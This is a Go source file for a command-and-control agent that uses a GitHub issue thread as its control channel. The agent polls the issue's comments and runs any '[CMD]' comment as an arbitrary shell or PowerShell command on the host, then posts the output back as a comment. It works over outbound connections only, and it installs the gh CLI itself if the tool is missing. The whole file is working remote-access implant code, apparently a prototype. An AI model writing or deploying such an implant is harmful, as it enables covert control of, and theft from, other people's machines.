package agent

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"compress/gzip"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

const (
	// CmdPrefix marks a comment as a command from the server.
	CmdPrefix = "[CMD]"
	// OutPrefix marks a comment as output from the agent.
	OutPrefix = "[OUT]"

	// pollInterval is how often the agent checks GitHub for new commands.
	// GitHub allows 5000 authenticated requests/hr — at 5s intervals that's ~720/hr.
	pollInterval = 5 * time.Second
)

// Comment mirrors only the GitHub API comment fields we care about.
type Comment struct {
	ID   int64  `json:"id"`
	Body string `json:"body"`
	User struct {
		Login string `json:"login"`
	} `json:"user"`
}

// Agent polls a specific GitHub issue thread using the gh CLI.
// It makes only outbound connections — no listening port, works behind NAT/firewalls.
type Agent struct {
	repo        string // "owner/repo" e.g. "kkirabo/c2prototype"
	issueNumber int
	token       string
	lastSeenID  int64 // highest comment ID already processed; avoids re-running old commands
}

// New creates an Agent for the given repo and issue thread.
func New(repo string, issueNumber int) *Agent {
	return &Agent{repo: repo, issueNumber: issueNumber}
}

// Run is the agent entry point. It sets up dependencies, verifies auth,
// then enters the poll loop. Blocks indefinitely.
func (a *Agent) Run() error {
	if err := a.setup(); err != nil {
		return err
	}

	fmt.Printf("[agent] Polling %s issue #%d every %s\n", a.repo, a.issueNumber, pollInterval)

	// Fast-forward lastSeenID so we don't re-execute commands from before we started.
	if err := a.catchUp(); err != nil {
		fmt.Printf("[agent] Warning — could not read comment history: %s\n", err)
	}

	ticker := time.NewTicker(pollInterval)
	defer ticker.Stop()

	for range ticker.C {
		if err := a.poll(); err != nil {
			fmt.Printf("[agent] Poll error: %s\n", err)
		}
	}
	return nil
}

// ── Setup ──────────────────────────────────────────────────────────────────────

// setup ensures gh is reachable and GITHUB_TOKEN is set, then returns.
// It validates user authentication and repository access before entering the loop.
func (a *Agent) setup() error {
	fmt.Println("[agent] Checking dependencies...")

	if err := ensureGH(); err != nil {
		return err
	}

	// gh reads GITHUB_TOKEN / GH_TOKEN from the environment automatically.
	token := os.Getenv("GITHUB_TOKEN")
	if token == "" {
		token = os.Getenv("GH_TOKEN")
		if token == "" {
			return fmt.Errorf("neither GITHUB_TOKEN nor GH_TOKEN is set — gh needs a token to authenticate")
		}
	}
	// Sanitize token (remove accidental quotes or whitespace from PowerShell/cmd)
	token = strings.TrimSpace(token)
	token = strings.Trim(token, `"'`)

	a.token = token
	os.Setenv("GITHUB_TOKEN", token)
	os.Setenv("GH_TOKEN", token)

	// Step 1: Verify token identity
	userCmd := exec.Command("gh", "api", "user", "--jq", ".login")
	userCmd.Env = append(os.Environ(), "GH_TOKEN="+token, "GITHUB_TOKEN="+token)
	userOut, err := userCmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("GitHub authentication failed: %s (please check that GITHUB_TOKEN is valid)", strings.TrimSpace(string(userOut)))
	}
	login := strings.TrimSpace(string(userOut))
	fmt.Printf("[agent] Authenticated as GitHub user: %s ✓\n", login)

	// Step 2: Verify repository access
	repoCmd := exec.Command("gh", "api", fmt.Sprintf("repos/%s", a.repo), "--jq", ".full_name")
	repoCmd.Env = append(os.Environ(), "GH_TOKEN="+token, "GITHUB_TOKEN="+token)
	repoOut, err := repoCmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("token for %q cannot access repository %q: %s\n"+
			"  NOTE: GitHub returns 404 Not Found on private repos when permissions are missing!\n"+
			"  Please ensure your Personal Access Token has:\n"+
			"    - 'repo' scope (if using Classic PAT)\n"+
			"    - Repository access to %q with 'Issues: Read and write' (if using Fine-Grained PAT)",
			login, a.repo, strings.TrimSpace(string(repoOut)), a.repo)
	}
	fmt.Printf("[agent] Repository access verified: %s ✓\n", strings.TrimSpace(string(repoOut)))

	// Step 3: Verify target issue exists
	issueCmd := exec.Command("gh", "api", fmt.Sprintf("repos/%s/issues/%d", a.repo, a.issueNumber), "--jq", ".title")
	issueCmd.Env = append(os.Environ(), "GH_TOKEN="+token, "GITHUB_TOKEN="+token)
	issueOut, err := issueCmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("issue #%d cannot be accessed: %s\n  (Check if issue #%d exists in %s)",
			a.issueNumber, strings.TrimSpace(string(issueOut)), a.issueNumber, a.repo)
	}
	fmt.Printf("[agent] Issue #%d verified: %q ✓\n", a.issueNumber, strings.TrimSpace(string(issueOut)))

	return nil
}

// ensureGH makes sure the gh CLI is callable. Strategy:
//  1. Check PATH — if gh is there, done.
//  2. Scan known install locations and inject into PATH — if found, done.
//  3. Download gh binary directly from GitHub Releases (pure Go, no installers).
//  4. Scan known locations again — if found, done.
//  5. Final PATH check — if still missing, fail with a helpful message.
func ensureGH() error {
	// Step 1: already in PATH?
	if ghInPath() {
		fmt.Println("[agent] gh already installed ✓")
		return nil
	}

	// Step 2: installed but not in this process's PATH?
	if injectKnownGHPaths() {
		fmt.Println("[agent] gh found on disk — PATH updated ✓")
		return nil
	}

	// Step 3: actually try to install
	fmt.Println("[agent] gh not found — attempting install...")
	installGH() // intentionally ignore error — winget returns non-zero for "already installed"

	// Step 4: scan again — binary may now be on disk even if exit code was non-zero
	if injectKnownGHPaths() {
		fmt.Println("[agent] gh installed ✓")
		return nil
	}

	// Step 5: one last PATH check after inject
	if ghInPath() {
		fmt.Println("[agent] gh installed ✓")
		return nil
	}

	return fmt.Errorf("gh CLI not found — install it manually: https://cli.github.com")
}

// ghInPath returns true if gh is callable from the current process PATH.
func ghInPath() bool {
	_, err := exec.LookPath("gh")
	return err == nil
}

// injectKnownGHPaths scans the standard gh install locations for every
// platform and prepends any that exist to the current process PATH.
// Returns true if gh is callable after the injection.
//
// Known locations (from gh docs):
//
//	Windows winget : %LOCALAPPDATA%\Microsoft\WindowsApps
//	Windows scoop  : %USERPROFILE%\scoop\apps\gh\current\bin
//	macOS Silicon  : /opt/homebrew/bin
//	macOS Intel    : /usr/local/bin
//	Linux apt/dnf  : /usr/bin  or  /usr/local/bin
func injectKnownGHPaths() bool {
	localAppData := os.Getenv("LOCALAPPDATA")
	userProfile := os.Getenv("USERPROFILE")
	programFiles := os.Getenv("ProgramFiles")         // C:\Program Files
	programFilesX86 := os.Getenv("ProgramFiles(x86)") // C:\Program Files (x86)
	home, _ := os.UserHomeDir()

	candidates := []string{
		// Windows — default winget/MSI install location (most common)
		filepath.Join(programFiles, "GitHub CLI"),
		filepath.Join(programFilesX86, "GitHub CLI"),
		// Windows — winget WindowsApps junction
		filepath.Join(localAppData, "Microsoft", "WindowsApps"),
		// Windows — scoop
		filepath.Join(userProfile, "scoop", "apps", "gh", "current", "bin"),
		// Windows — our own direct download location
		filepath.Join(localAppData, "gh"),
		// macOS — Homebrew Apple Silicon
		"/opt/homebrew/bin",
		// macOS — Homebrew Intel
		"/usr/local/bin",
		// Linux — apt / dnf
		"/usr/bin",
		"/usr/local/bin",
		// Linux — snap
		"/snap/bin",
		// our own direct download location (Linux + macOS): ~/.local/bin
		filepath.Join(home, ".local", "bin"),
	}

	sep := string(os.PathListSeparator)
	current := os.Getenv("PATH")
	changed := false

	for _, dir := range candidates {
		if _, err := os.Stat(dir); err != nil {
			continue // directory doesn't exist on this machine
		}
		if !strings.Contains(current, dir) {
			current = dir + sep + current
			changed = true
		}
	}

	if changed {
		os.Setenv("PATH", current)
	}

	return ghInPath()
}

// installGH downloads the gh binary directly from GitHub Releases using only
// Go's net/http — no external executables, no GUI installers, no package managers.
//
// Flow:
//  1. Hit the GitHub API to get the latest release tag
//  2. Build the download URL for this OS + arch
//  3. Download the archive (.zip on Windows/macOS, .tar.gz on Linux) to a temp file
//  4. Extract just the gh binary from the archive
//  5. Write it to ~/.local/bin/ (Linux/macOS) or %LOCALAPPDATA%\gh\ (Windows)
//  6. Inject that directory into the current process PATH
func installGH() {
	fmt.Println("[agent] Fetching latest gh release info...")

	version, err := latestGHVersion()
	if err != nil {
		fmt.Printf("[agent] Could not fetch gh version: %s\n", err)
		return
	}
	fmt.Printf("[agent] Downloading gh %s for %s/%s...\n", version, runtime.GOOS, runtime.GOARCH)

	downloadURL, archiveName, binaryPath := ghReleaseInfo(version)

	// Download archive to a temp file
	tmp, err := os.CreateTemp("", "gh-install-*")
	if err != nil {
		fmt.Printf("[agent] Could not create temp file: %s\n", err)
		return
	}
	tmpPath := tmp.Name()
	tmp.Close()
	defer os.Remove(tmpPath)

	if err := httpDownload(downloadURL, tmpPath); err != nil {
		fmt.Printf("[agent] Download failed: %s\n", err)
		return
	}
	fmt.Println("[agent] Download complete. Extracting...")

	// Write gh binary to a local dir we control
	installDir := ghLocalInstallDir()
	if err := os.MkdirAll(installDir, 0o755); err != nil {
		fmt.Printf("[agent] Could not create install dir %s: %s\n", installDir, err)
		return
	}

	binaryName := "gh"
	if runtime.GOOS == "windows" {
		binaryName = "gh.exe"
	}
	destPath := filepath.Join(installDir, binaryName)

	if strings.HasSuffix(archiveName, ".zip") {
		err = extractFromZip(tmpPath, binaryPath, destPath)
	} else {
		err = extractFromTarGz(tmpPath, binaryPath, destPath)
	}
	if err != nil {
		fmt.Printf("[agent] Extraction failed: %s\n", err)
		return
	}

	// Make the binary executable on Unix
	if runtime.GOOS != "windows" {
		if err := os.Chmod(destPath, 0o755); err != nil {
			fmt.Printf("[agent] Could not chmod gh: %s\n", err)
		}
	}

	// Inject the install dir into the current process PATH
	sep := string(os.PathListSeparator)
	os.Setenv("PATH", installDir+sep+os.Getenv("PATH"))
	fmt.Printf("[agent] gh installed to %s ✓\n", destPath)
}

// latestGHVersion calls the GitHub releases API and returns the latest version
// string without the leading "v" (e.g. "2.63.0").
func latestGHVersion() (string, error) {
	resp, err := http.Get("https://api.github.com/repos/cli/cli/releases/latest")
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	var release struct {
		TagName string `json:"tag_name"` // e.g. "v2.63.0"
	}
	if err := json.NewDecoder(resp.Body).Decode(&release); err != nil {
		return "", err
	}
	return strings.TrimPrefix(release.TagName, "v"), nil
}

// ghReleaseInfo returns the download URL, archive filename, and path of the
// gh binary inside the archive for the current OS and architecture.
//
// gh release naming convention:
//
//	Windows : gh_{ver}_windows_{arch}.zip   → gh_{ver}_windows_{arch}/bin/gh.exe
//	macOS   : gh_{ver}_macOS_{arch}.zip     → gh_{ver}_macOS_{arch}/bin/gh
//	Linux   : gh_{ver}_linux_{arch}.tar.gz  → gh_{ver}_linux_{arch}/bin/gh
func ghReleaseInfo(version string) (downloadURL, archiveName, binaryPath string) {
	arch := runtime.GOARCH // amd64, arm64

	var osName, ext string
	switch runtime.GOOS {
	case "windows":
		osName, ext = "windows", "zip"
	case "darwin":
		osName, ext = "macOS", "zip"
	default:
		osName, ext = "linux", "tar.gz"
	}

	base := fmt.Sprintf("gh_%s_%s_%s", version, osName, arch)
	archiveName = base + "." + ext

	binaryName := "gh"
	if runtime.GOOS == "windows" {
		binaryName = "gh.exe"
	}
	// Path inside the archive always uses forward slashes
	binaryPath = base + "/bin/" + binaryName

	downloadURL = "https://github.com/cli/cli/releases/download/v" + version + "/" + archiveName
	return
}

// ghLocalInstallDir returns the directory where we write the gh binary.
// Chosen to be user-writable without needing elevated privileges.
func ghLocalInstallDir() string {
	switch runtime.GOOS {
	case "windows":
		// %LOCALAPPDATA%\gh — user-writable, no admin needed
		return filepath.Join(os.Getenv("LOCALAPPDATA"), "gh")
	default:
		// ~/.local/bin — standard user-local bin on Linux and macOS
		home, _ := os.UserHomeDir()
		return filepath.Join(home, ".local", "bin")
	}
}

// httpDownload fetches url and writes the body to destPath.
func httpDownload(url, destPath string) error {
	resp, err := http.Get(url) // #nosec G107 — URL is constructed from a known pattern
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("HTTP %d from %s", resp.StatusCode, url)
	}

	f, err := os.Create(destPath)
	if err != nil {
		return err
	}
	defer f.Close()

	_, err = io.Copy(f, resp.Body)
	return err
}

// extractFromZip finds the file at innerPath inside a zip archive and writes
// it to destPath. Used for Windows and macOS gh releases.
func extractFromZip(archivePath, innerPath, destPath string) error {
	r, err := zip.OpenReader(archivePath)
	if err != nil {
		return err
	}
	defer r.Close()

	for _, f := range r.File {
		// Normalise separators so this works on Windows too
		if filepath.ToSlash(f.Name) == innerPath {
			rc, err := f.Open()
			if err != nil {
				return err
			}
			defer rc.Close()

			out, err := os.Create(destPath)
			if err != nil {
				return err
			}
			defer out.Close()

			_, err = io.Copy(out, rc) // #nosec G110 — trusted source (GitHub releases)
			return err
		}
	}
	return fmt.Errorf("binary not found in zip at %q", innerPath)
}

// extractFromTarGz finds the file at innerPath inside a .tar.gz archive and
// writes it to destPath. Used for Linux gh releases.
func extractFromTarGz(archivePath, innerPath, destPath string) error {
	f, err := os.Open(archivePath)
	if err != nil {
		return err
	}
	defer f.Close()

	gz, err := gzip.NewReader(f)
	if err != nil {
		return err
	}
	defer gz.Close()

	tr := tar.NewReader(gz)
	for {
		hdr, err := tr.Next()
		if err == io.EOF {
			break
		}
		if err != nil {
			return err
		}
		if hdr.Name == innerPath {
			out, err := os.Create(destPath)
			if err != nil {
				return err
			}
			defer out.Close()

			_, err = io.Copy(out, tr) // #nosec G110 — trusted source (GitHub releases)
			return err
		}
	}
	return fmt.Errorf("binary not found in tar.gz at %q", innerPath)
}

// ── Polling ────────────────────────────────────────────────────────────────────

// catchUp reads all existing comments and sets lastSeenID to the newest one.
// This ensures we skip commands posted before the agent came online.
func (a *Agent) catchUp() error {
	comments, err := a.getComments()
	if err != nil {
		return err
	}
	for _, c := range comments {
		if c.ID > a.lastSeenID {
			a.lastSeenID = c.ID
		}
	}
	if a.lastSeenID > 0 {
		fmt.Printf("[agent] Fast-forwarded past comment #%d — skipping older commands\n", a.lastSeenID)
	} else {
		fmt.Println("[agent] No prior comments found. Watching for first [CMD]...")
	}
	return nil
}

// poll fetches comments and processes any new [CMD] ones in order.
func (a *Agent) poll() error {
	comments, err := a.getComments()
	if err != nil {
		return err
	}

	for _, c := range comments {
		// Skip anything already processed
		if c.ID <= a.lastSeenID {
			continue
		}

		// Advance cursor even for non-CMD comments (e.g. our own [OUT] replies)
		if !strings.HasPrefix(c.Body, CmdPrefix) {
			a.lastSeenID = c.ID
			continue
		}

		// Strip [CMD] prefix and run the command
		cmd := strings.TrimSpace(strings.TrimPrefix(c.Body, CmdPrefix))
		fmt.Printf("[agent] Received command (comment #%d): %s\n", c.ID, cmd)

		output := a.execute(cmd)

		if err := a.postComment(OutPrefix + " " + output); err != nil {
			fmt.Printf("[agent] Failed to post output: %s\n", err)
		} else {
			fmt.Println("[agent] Output posted.")
		}

		a.lastSeenID = c.ID // mark command as done
	}
	return nil
}

// ── GitHub CLI wrappers ────────────────────────────────────────────────────────

// getComments calls the GitHub API via gh and returns parsed comments.
// gh automatically uses GH_TOKEN / GITHUB_TOKEN for auth and sets the default API version header.
func (a *Agent) getComments() ([]Comment, error) {
	cmd := exec.Command(
		"gh", "api",
		fmt.Sprintf("repos/%s/issues/%d/comments", a.repo, a.issueNumber),
		"--header", "X-GitHub-Api-Version: 2022-11-28",
	)
	cmd.Env = append(os.Environ(), "GH_TOKEN="+a.token, "GITHUB_TOKEN="+a.token)

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	if err := cmd.Run(); err != nil {
		errDetail := strings.TrimSpace(stderr.String())
		if errDetail == "" {
			errDetail = err.Error()
		}
		return nil, fmt.Errorf("gh api: %s", errDetail)
	}

	var comments []Comment
	if err := json.Unmarshal(stdout.Bytes(), &comments); err != nil {
		return nil, fmt.Errorf("parsing comments JSON: %w (raw output: %s)", err, stdout.String())
	}
	return comments, nil
}

// postComment posts a comment on the issue thread via the gh CLI.
// Used to send [OUT] replies back to the server.
func (a *Agent) postComment(body string) error {
	cmd := exec.Command(
		"gh", "issue", "comment",
		fmt.Sprintf("%d", a.issueNumber),
		"--repo", a.repo,
		"--body", body,
	)
	cmd.Env = append(os.Environ(), "GH_TOKEN="+a.token, "GITHUB_TOKEN="+a.token)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("gh issue comment: %w\n%s", err, string(out))
	}
	return nil
}

// ── Command execution ──────────────────────────────────────────────────────────

// execute runs a shell command and returns its combined stdout+stderr.
// Uses the platform's native shell so pipes, redirects, env vars, etc. all work.
func (a *Agent) execute(cmd string) string {
	var c *exec.Cmd

	// #nosec G204 — intentional: arbitrary remote execution is the purpose of a C2 agent
	switch runtime.GOOS {
	case "windows":
		// Run via PowerShell with -NoProfile and -NonInteractive for fast, clean command execution
		c = exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", cmd)
	default:
		// covers Linux and macOS (darwin)
		c = exec.Command("/bin/sh", "-c", cmd)
	}

	out, err := c.CombinedOutput()
	result := strings.TrimSpace(string(out))

	if err != nil {
		if result != "" {
			return fmt.Sprintf("%s\n[exit error: %s]", result, err)
		}
		return fmt.Sprintf("[exit error: %s]", err)
	}
	if result == "" {
		return "[command produced no output]"
	}
	return result
}
